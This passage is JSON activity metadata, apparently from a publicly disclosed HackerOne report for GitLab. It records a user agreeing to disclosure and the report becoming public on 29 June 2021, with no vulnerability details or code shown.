                "profile_picture_urls": {
                    "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
                },
                "hackerone_triager": false,
                "hackerone_employee": false
            },
            "genius_execution_id": null,
            "team_handle": "gitlab"
        },
        {
            "id": 12280294,
            "is_internal": false,
            "editable": false,
            "type": "Activities::AgreedOnGoingPublic",
            "message": "",
            "automated_response": false,
            "created_at": "2021-06-29T06:31:08.318Z",
            "updated_at": "2021-06-29T06:31:08.318Z",
            "actor": {
                "username": "vdesousa",
                "cleared": false,
                "verified": false,
                "url": "/vdesousa",
                "profile_picture_urls": {
                    "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
                },
                "hackerone_triager": false,
                "hackerone_employee": false
            },
            "genius_execution_id": null,
            "team_handle": "gitlab"
        },
        {
            "id": 12280296,
            "is_internal": false,
            "editable": false,
            "type": "Activities::ReportBecamePublic",
            "message": "",
            "automated_response": false,
            "created_at": "2021-06-29T06:31:08.471Z",
            "updated_at": "2021-06-29T06:31:08.471Z",
            "actor": {
                "username": "vdesousa",
                "cleared": false,
                "verified": false,
                "url": "/vdesousa",
                "profile_picture_urls": {
                    "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
                },
                "hackerone_triager": false,
                "hackerone_employee": false
            },
            "genius_execution_id": null,
            "team_handle": "gitlab"
        }
    ],
    "activity_page_count": 1,
    "activity_page_number": 1,
    "summaries": [
        {
            "category": "team",
            "can_view?": true,
            "can_create?": false
        },
        {
            "category": "researcher",
            "can_view?": true,
            "can_create?": false
        }
    ]
}